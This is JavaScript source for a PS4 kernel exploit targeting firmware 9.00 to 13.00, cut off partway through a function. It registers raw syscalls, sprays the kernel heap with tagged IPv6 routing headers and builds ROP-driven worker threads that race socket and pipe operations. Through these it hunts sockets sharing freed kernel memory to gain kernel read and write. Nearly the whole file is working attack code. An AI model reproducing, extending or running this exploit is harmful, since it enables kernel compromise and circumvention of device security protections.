if (typeof libc_addr === 'undefined') {
  include('userland.js');
}
include('kernel.js');
include('binloader.js');
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    } else {
      targetLength = targetLength - this.length;
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this);
    }
  };
}
fn.register(0x29, 'dup', ['bigint'], 'bigint');
var dup = fn.dup;
fn.register(0x06, 'close', ['bigint'], 'bigint');
var close = fn.close;
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
var read = fn.read;
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
var write = fn.write;
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
var ioctl = fn.ioctl;
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;
fn.register(0x16A, 'kqueue', [], 'bigint');
var kqueue = fn.kqueue;
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;
fn.register(0x17, 'setuid', ['number'], 'bigint');
var setuid = fn.setuid;
fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;
fn.register(0x14B, 'sched_yield', [], 'bigint');
var sched_yield = fn.sched_yield;
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
var netcontrol = fn.netcontrol;
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
var thr_new = fn.thr_new;
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
var thr_kill = fn.thr_kill;
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
var fcntl = fn.fcntl;
var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);
var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
var AF_UNIX = 1;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41;
var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xffff;
var IPV6_RTHDR = 51;
var IPV6_RTHDR_TYPE_0 = 0;
var RTP_PRIO_REALTIME = 2;
var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;
var CPU_LEVEL_WHICH = 3;
var CPU_WHICH_TID = 1;
var IOV_SIZE = 0x10;
var CPU_SET_SIZE = 0x10;
var PIPEBUF_SIZE = 0x18;
var MSG_HDR_SIZE = 0x30;
var FILEDESCENT_SIZE = 0x8;
var UCRED_SIZE = 0x168;
var RTHDR_TAG = 0x13370000;
var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;
var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 8;
var UIO_THREAD_NUM = 8;
function cfg_num(key, def, min, max) {
  var v = typeof CONFIG !== 'undefined' && CONFIG ? Number(CONFIG[key]) : def;
  if (!isFinite(v)) v = def;
  v = Math.floor(v);
  if (v < min) v = min;
  if (v > max) v = max;
  return v;
}
var MAIN_LOOP_ITERATIONS = cfg_num('main_loop_iterations', 3, 1, 10);
var TRIPLEFREE_ITERATIONS = cfg_num('triplefree_iterations', 8, 1, 32);
var KQUEUE_ITERATIONS = cfg_num('kqueue_iterations', 5000, 500, 20000);
var KQUEUE_BATCH = 8;
var KQUEUE_PROOF_SAMPLES = 3;
var FIND_TRIPLET_FAST = 5000;
var SLOW_RW_TRIES = 4;
var RW_RECOVERY_TRIES = 1;
var MAX_PROC_WALK = 1024;
var MAX_ROUNDS_TWIN = cfg_num('max_rounds_twin', 5, 1, 20);
var MAX_ROUNDS_TRIPLET = cfg_num('max_rounds_triplet', 200, 10, 1000);
var JB_RETRIES = cfg_num('jb_retries', 3, 0, 6);
var JB_RETRY_DELAY_MS = 2000;
var MAIN_CORE = 4;
var MAIN_RTPRIO = 0x100;
var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;
var F_SETFL = 4;
var O_NONBLOCK = 4;
var FW_VERSION = null; // Needs to be initialized to patch kernel
/***************************/
/*      Used constiables     */
/** *********************** */
var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len = -1;
var leak_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
var check_len = malloc(4);
var fdt_ofiles = new BigInt(0);
var master_r_pipe_file = new BigInt(0);
var victim_r_pipe_file = new BigInt(0);
var master_r_pipe_data = new BigInt(0);
var victim_r_pipe_data = new BigInt(0);
var master_pipe_buf = malloc(PIPEBUF_SIZE);
write32(check_len, 8);
var msg = malloc(MSG_HDR_SIZE);
var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
var uio_sock = malloc(8);
var iov_sock = malloc(8);
var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);
var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;
var uaf_socket;
var uio_sock_0;
var uio_sock_1;
var iov_sock_0;
var iov_sock_1;
var pipe_sock = malloc(8);
var master_pipe = [0, 0];
var victim_pipe = [0, 0];
var masterRpipeFd;
var masterWpipeFd;
var victimRpipeFd;
var victimWpipeFd;
var kq_fdp;
var kl_lock;
var tmp = malloc(PAGE_SIZE);
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;
function build_rthdr(buf, size) {
  var len = (size >> 3) - 1 & ~1;
  var actual_size = len + 1 << 3;
  write8(buf.add(0x00), 0); // ip6r_nxt
  write8(buf.add(0x01), len); // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0); // ip6r_type
  write8(buf.add(0x03), len >> 1); // ip6r_segleft
  return actual_size;
}
function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result));
  }
  return result;
}
var sockopt_len_ptr = malloc(4);
var nanosleep_timespec = malloc(0x10);
var cpu_mask_buf = malloc(0x10);
var saved_cpu_mask_buf=malloc(0x10),affinity_saved=false,saved_rtprio_type=-1,saved_rtprio_value=-1;
var rtprio_scratch = malloc(0x4);
var sockopt_val_buf = malloc(4);
var nc_set_buf = malloc(8);
var nc_clear_buf = malloc(8);
var spawn_thr_args = malloc(0x80);
var spawn_tid = malloc(0x8);
var spawn_cpid = malloc(0x8);
function get_sockopt(sd, level, optname, optval, optlen) {
  write32(sockopt_len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  if (result.eq(BigInt_Error)) throw new Error('get_sockopt error: ' + hex(result));
  return read32(sockopt_len_ptr);
}
function set_rthdr(sd, buf, len) { return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len); }
function get_rthdr(sd, buf, max_len) { return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len); }
function free_rthdrs(sds) { for (var sd of sds) if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0); }
function free_rthdr(sd) { set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0); }
function pin_to_core(core) { write32(cpu_mask_buf, 1 << core); cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf); }
function get_core_index(mask_addr) { var num=Number(read32(mask_addr)),position=0; while(num>0){num=num>>>1;position++;} return position-1; }
function get_current_core() {
  var rv=cpuset_getaffinity(3,1,BigInt_Error,0x10,cpu_mask_buf);
  if(!rv.eq(BigInt_Error)){write64(saved_cpu_mask_buf,read64(cpu_mask_buf));write64(saved_cpu_mask_buf.add(8),read64(cpu_mask_buf.add(8)));affinity_saved=true;}
  return get_core_index(cpu_mask_buf);
}
function restore_saved_affinity(){if(!affinity_saved)return false;var rv=cpuset_setaffinity(3,1,BigInt_Error,0x10,saved_cpu_mask_buf);affinity_saved=false;return !rv.eq(BigInt_Error);}
function set_rtprio(prio){write16(rtprio_scratch,PRI_REALTIME);write16(rtprio_scratch.add(2),prio);rtprio_thread(RTP_SET,0,rtprio_scratch);}
function get_rtprio(){
  write16(rtprio_scratch,PRI_REALTIME);write16(rtprio_scratch.add(2),0);var rv=rtprio_thread(RTP_LOOKUP,0,rtprio_scratch);
  if(!rv.eq(BigInt_Error)){saved_rtprio_type=Number(read16(rtprio_scratch));saved_rtprio_value=Number(read16(rtprio_scratch.add(2)));}
  return Number(read16(rtprio_scratch.add(2)));
}
function restore_saved_rtprio(){if(saved_rtprio_type<0||saved_rtprio_value<0)return false;write16(rtprio_scratch,saved_rtprio_type);write16(rtprio_scratch.add(2),saved_rtprio_value);var rv=rtprio_thread(RTP_SET,0,rtprio_scratch);saved_rtprio_type=saved_rtprio_value=-1;return !rv.eq(BigInt_Error);}
function create_workers() {
  var sock_buf = malloc(8);
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var _ready = iov_thread_ready.add(8 * i);
    var _done = iov_thread_done.add(8 * i);
    var _signal_buf = iov_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_ = read32(sock_buf);
    var _pipe_2 = read32(sock_buf.add(4));
    var _ret = iov_recvmsg_worker_rop(_ready, new BigInt(_pipe_), _done, _signal_buf);
    var _worker = {
      rop: _ret.rop,
      loop_size: _ret.loop_size,
      pipe_0: _pipe_,
      pipe_1: _pipe_2,
      ready: _ready,
      done: _done,
      signal_buf: _signal_buf
    };
    iov_recvmsg_workers[i] = _worker;
  }
  for (var _i = 0; _i < UIO_THREAD_NUM; _i++) {
    var _ready2 = uio_readv_thread_ready.add(8 * _i);
    var _done2 = uio_readv_thread_done.add(8 * _i);
    var _signal_buf2 = uio_readv_signal_buf.add(8 * _i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_3 = read32(sock_buf);
    var _pipe_4 = read32(sock_buf.add(4));
    var _ret2 = uio_readv_worker_rop(_ready2, new BigInt(_pipe_3), _done2, _signal_buf2);
    var _worker2 = {
      rop: _ret2.rop,
      loop_size: _ret2.loop_size,
      pipe_0: _pipe_3,
      pipe_1: _pipe_4,
      ready: _ready2,
      done: _done2,
      signal_buf: _signal_buf2
    };
    uio_readv_workers[_i] = _worker2;
  }
  for (var _i2 = 0; _i2 < UIO_THREAD_NUM; _i2++) {
    var _ready3 = uio_writev_thread_ready.add(8 * _i2);
    var _done3 = uio_writev_thread_done.add(8 * _i2);
    var _signal_buf3 = uio_writev_signal_buf.add(8 * _i2);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_5 = read32(sock_buf);
    var _pipe_6 = read32(sock_buf.add(4));
    var _ret3 = uio_writev_worker_rop(_ready3, new BigInt(_pipe_5), _done3, _signal_buf3);
    var _worker3 = {
      rop: _ret3.rop,
      loop_size: _ret3.loop_size,
      pipe_0: _pipe_5,
      pipe_1: _pipe_6,
      ready: _ready3,
      done: _done3,
      signal_buf: _signal_buf3
    };
    uio_writev_workers[_i2] = _worker3;
  }
  var ready = spray_ipv6_ready;
  var done = spray_ipv6_done;
  var signal_buf = spray_ipv6_signal_buf;
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
  var pipe_0 = read32(sock_buf);
  var pipe_1 = read32(sock_buf.add(4));
  var ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf);
  var worker = {
    rop: ret.rop,
    loop_size: ret.loop_size,
    pipe_0,
    pipe_1,
    ready,
    done,
    signal_buf
  };
  spray_ipv6_worker = worker; // --> Worker data
}
function init_workers() {
  init_threading(); // save needed info for longjmp
  var worker;
  var ret;
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
    }
    var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = thread_id; // Save thread ID
  }
  for (var _i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
    worker = uio_readv_workers[_i3];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + _i3 + ']');
    }
    var _thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = _thread_id; // Save thread ID
  }
  for (var _i4 = 0; _i4 < UIO_THREAD_NUM; _i4++) {
    worker = uio_writev_workers[_i4];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + _i4 + ']');
    }
    var _thread_id2 = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
    worker.thread_id = _thread_id2; // Save thread ID
  }
}
function nanosleep_fun(nsec) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9)); // tv_sec
  write64(nanosleep_timespec.add(8), nsec % 1e9); // tv_nsec
  nanosleep(nanosleep_timespec);
}
function wait_for(addr, threshold) {
  while (!read64(addr).eq(threshold)) {
    nanosleep_fun(1);
  }
}
function trigger_iov_recvmsg() {
  var worker;
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    write64(worker.done, 0);
  }
  for (var _i5 = 0; _i5 < IOV_THREAD_NUM; _i5++) {
    worker = iov_recvmsg_workers[_i5];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i5 + ']');
    }
  }
}
function wait_iov_recvmsg() {
  var worker;
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    wait_for(worker.done, 1);
  }
}
function trigger_ipv6_spray_and_read() {
  write64(spray_ipv6_worker.done, 0);
  var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spray_ipv6_worker');
  }
  var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
  spray_ipv6_worker.thread_id = thread_id; // Save thread ID
  ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
  if (ret.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker");
  }
}
function wait_ipv6_spray_and_read() {
  wait_for(spray_ipv6_worker.done, 1);
}
function trigger_uio_readv() {
  var worker;
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    write64(worker.done, 0);
  }
  for (var _i6 = 0; _i6 < UIO_THREAD_NUM; _i6++) {
    worker = uio_readv_workers[_i6];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i6 + ']');
    }
  }
}
function wait_uio_readv() {
  var worker;
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    wait_for(worker.done, 1);
  }
}
function trigger_uio_writev() {
  var worker;
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    write64(worker.done, 0);
  }
  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
    worker = uio_writev_workers[_i7];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
    }
  }
}
function wait_uio_writev() {
  var worker;
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    wait_for(worker.done, 1);
  }
}
function init() {
  log('=== PS4 Kernel Exploit ===');
  log('build: eb8d306');
  log('tag: 1.4');
  FW_VERSION = get_fwversion();
  log('Detected PS4 firmware: ' + FW_VERSION);
  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version.\nAborting...');
    send_notification('Failed to detect PS4 firmware version.\nAborting...');
    return false;
  }
  var compare_version = (a, b) => {
    var a_arr = a.split('.');
    var amaj = Number(a_arr[0]);
    var amin = Number(a_arr[1]);
    var b_arr = b.split('.');
    var bmaj = Number(b_arr[0]);
    var bmin = Number(b_arr[1]);
    return amaj === bmaj ? amin - bmin : amaj - bmaj;
  };
  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...');
    send_notification('Unsupported PS4 firmware\nAborting...');
    return false;
  }
  kernel_offset = get_kernel_offset(FW_VERSION);
  log('Kernel offsets loaded for FW ' + FW_VERSION);
  return true;
}
var prev_core = -1;
var prev_rtprio = -1;
var cleanup_called = false;
var burned = new Set();
var quarantined_socks = [];
var committed = false;
var rebootRequired = false;
var uncontained = '';
var rwValidated = false;
var lastReadNoLeak=false;
function burn_socket(index, why) {
  if (typeof index === 'number' && index >= 0 && index < ipv6_socks.length) {
    burned.add(index);
  }
}
function kernel_ptr_ok(value) {
  return value && typeof value.hi === 'number' && typeof value.lo === 'number' &&
    value.hi >= 0xFFFF0000 && (value.lo & 7) === 0;
}
function require_kernel_ptr(value, label) {
  if (!kernel_ptr_ok(value)) {
    uncontained = label + '-pointer';
    rebootRequired = true;
    throw new Error('Kernel pointer validation failed');
  }
  return value;
}
function mark_reboot_required(reason) {
  if (reason && !uncontained) uncontained = reason;
  rebootRequired = true;
}
function stop_for_reboot(reason) {
  if (exploit_end) return;
  exploit_end = true;
  mark_reboot_required(reason || 'post-commit-failure');
  if (!restore_saved_affinity() && prev_core >= 0) pin_to_core(prev_core);
  prev_core = -1;
  if (!restore_saved_rtprio() && prev_rtprio >= 0) set_rtprio(prev_rtprio);
  prev_rtprio = -1;
  log('Kernel state is not safely recoverable.');
  log('Restart the PS4 and try again.');
}
function setup() {
  debug('Preparing kernel stage...');
  prev_core = get_current_core();
  prev_rtprio = get_rtprio();
  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);
  debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
  }
  write64(msg.add(0x10), msgIov); // msg_iov
  write64(msg.add(0x18), MSG_IOV_NUM); // msg_iovlen
  var dummyBuffer = malloc(0x1000);
  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
  write64(uioIovRead.add(0x00), dummyBuffer);
  write64(uioIovWrite.add(0x00), dummyBuffer);
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
  uio_sock_0 = read32(uio_sock);
  uio_sock_1 = read32(uio_sock.add(4));
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
  iov_sock_0 = read32(iov_sock);
  iov_sock_1 = read32(iov_sock.add(4));
  for (var _i8 = 0; _i8 < ipv6_socks.length; _i8++) {
    ipv6_socks[_i8] = socket(AF_INET6, SOCK_STREAM, 0);
  }
  free_rthdrs(ipv6_socks);
  pipe(pipe_sock);
  master_pipe[0] = read32(pipe_sock);
  master_pipe[1] = read32(pipe_sock.add(4));
  pipe(pipe_sock);
  victim_pipe[0] = read32(pipe_sock);
  victim_pipe[1] = read32(pipe_sock.add(4));
  masterRpipeFd = master_pipe[0];
  masterWpipeFd = master_pipe[1];
  victimRpipeFd = victim_pipe[0];
  victimWpipeFd = victim_pipe[1];
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
  create_workers();
  init_workers();
  debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
}
function safe_close_fd(fd) {
  if (fd === undefined || fd === null) return;
  if (typeof fd === 'number' && fd < 3) return;
  try { close(typeof fd === 'number' ? new BigInt(fd) : fd); } catch (e) {}
}
function close_worker_fds(worker) {
  if (!worker) return;
  safe_close_fd(worker.pipe_0);
  safe_close_fd(worker.pipe_1);
}
function cleanup() {
  var kill_workers = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;
  var fresh_retry = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
  if (cleanup_called) return;
  cleanup_called = true;
  debug('Cleaning up...');
  for (var i = 0; i < ipv6_socks.length; i++) {
    if (burned.has(i)) {
      if (fresh_retry && ipv6_socks[i] !== undefined) quarantined_socks.push(ipv6_socks[i]);
      continue;
    }
    safe_close_fd(ipv6_socks[i]);
  }
  for (var _i9 = 0; _i9 < IOV_THREAD_NUM; _i9++) {
    var worker = iov_recvmsg_workers[_i9];
    if (worker !== undefined) {
      try { write(new BigInt(worker.pipe_1), worker.signal_buf, 1); } catch (e) {}
      if (kill_workers && worker.thread_id !== undefined) try { thr_kill(worker.thread_id, 9); } catch (e) {}
      if (fresh_retry) close_worker_fds(worker);
    }
  }
  for (var _i0 = 0; _i0 < UIO_THREAD_NUM; _i0++) {
    var _worker4 = uio_readv_workers[_i0];
    if (_worker4 !== undefined) {
      try { write(new BigInt(_worker4.pipe_1), _worker4.signal_buf, 1); } catch (e) {}
      if (kill_workers && _worker4.thread_id !== undefined) try { thr_kill(_worker4.thread_id, 9); } catch (e) {}
      if (fresh_retry) close_worker_fds(_worker4);
    }
  }
  for (var _i1 = 0; _i1 < UIO_THREAD_NUM; _i1++) {
    var _worker5 = uio_writev_workers[_i1];
    if (_worker5 !== undefined) {
      try { write(new BigInt(_worker5.pipe_1), _worker5.signal_buf, 1); } catch (e) {}
      if (kill_workers && _worker5.thread_id !== undefined) try { thr_kill(_worker5.thread_id, 9); } catch (e) {}
      if (fresh_retry) close_worker_fds(_worker5);
    }
  }
  if (spray_ipv6_worker !== undefined) {
    try { write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1); } catch (e) {}
    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) try { thr_kill(spray_ipv6_worker.thread_id, 9); } catch (e) {}
    if (fresh_retry) close_worker_fds(spray_ipv6_worker);
  }
  safe_close_fd(uio_sock_1); safe_close_fd(uio_sock_0);
  safe_close_fd(iov_sock_1); safe_close_fd(iov_sock_0);
  if (fresh_retry) {
    safe_close_fd(master_pipe[0]); safe_close_fd(master_pipe[1]);
    safe_close_fd(victim_pipe[0]); safe_close_fd(victim_pipe[1]);
    iov_recvmsg_workers = []; uio_readv_workers = []; uio_writev_workers = []; spray_ipv6_worker = undefined;
  }
  if (!restore_saved_affinity() && prev_core >= 0) { debug('Restoring to previous core: ' + prev_core); pin_to_core(prev_core); }
  prev_core = -1;
  if (!restore_saved_rtprio() && prev_rtprio >= 0) set_rtprio(prev_rtprio);
  prev_rtprio = -1;
  debug('Cleanup completed');
}
function fill_buffer_64(buf, val, len) {
  for (var i = 0; i < len; i = i + 8) {
    write64(buf.add(i), val);
  }
}
function find_twins() {
  var count = 0;
  var val;
  var i;
  var j;
  var zeroMemoryCount = 0;
  var spray_add = spray_rthdr.add(0x04);
  var lead_add = leak_rthdr.add(0x04);
  while (count < MAX_ROUNDS_TWIN) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('Exploit failed');
        uncontained = 'memory-exhausted';
        mark_reboot_required(uncontained);
        return false;
      }
    } else {
      zeroMemoryCount = 0;
    }
    if (count % 10 === 0) {
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      if (burned.has(i)) continue;
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      if (burned.has(i)) continue;
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      val = read32(lead_add);
      j = val & 0xFFFF;
      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j &&
          j >= 0 && j < ipv6_socks.length && !burned.has(j)) {
        twins[0] = i;
        twins[1] = j;
        log('Twins found: [' + i + '] [' + j + ']');
        return true;
      }
    }
    count++;
  }
  log('find_twins failed');
  return false;
}
function find_triplet(master, other, iterations) {
  if (typeof iterations === 'undefined') {
    iterations = MAX_ROUNDS_TRIPLET;
  }
  var count = 0;
  var val;
  var i;
  var j;
  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);
  while (count < iterations) {
    if (count % 100 === 0) {
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other || burned.has(i)) {
        continue;
      }
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    val = read32(leak_add);
    j = val & 0xFFFF;
    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other &&
        j >= 0 && j < ipv6_socks.length && !burned.has(j)) {
      return j;
    }
    count++;
  }
  return -1;
}
function triplet_index_ok(index) {
  return typeof index === 'number' && index >= 0 && index < ipv6_socks.length && !burned.has(index);
}
function triplets_usable() {
  return triplet_index_ok(triplets[0]) && triplet_index_ok(triplets[1]) && triplet_index_ok(triplets[2]) &&
         triplets[0] !== triplets[1] && triplets[0] !== triplets[2] && triplets[1] !== triplets[2];
}
function refind_triplets_fast() {
  if (!triplet_index_ok(triplets[0])) return false;
  for (var retry = 0; retry < 3; retry++) {
    var t1 = find_triplet(triplets[0], -1, FIND_TRIPLET_FAST);
    if (t1 !== -1) {
      var t2 = find_triplet(triplets[0], t1, FIND_TRIPLET_FAST);
      if (t1 !== -1 && t2 !== -1) {
        triplets[1] = t1;
        triplets[2] = t2;
        return true;
      }
    }
    sched_yield();
  }
  return false;
}
function triplets_agree_recovery() {
  if (!triplets_usable()) return false;
  var tags = new Array(3);
  var tag_add = leak_rthdr.add(0x04);
  for (var i = 0; i < triplets.length; i++) {
    try {
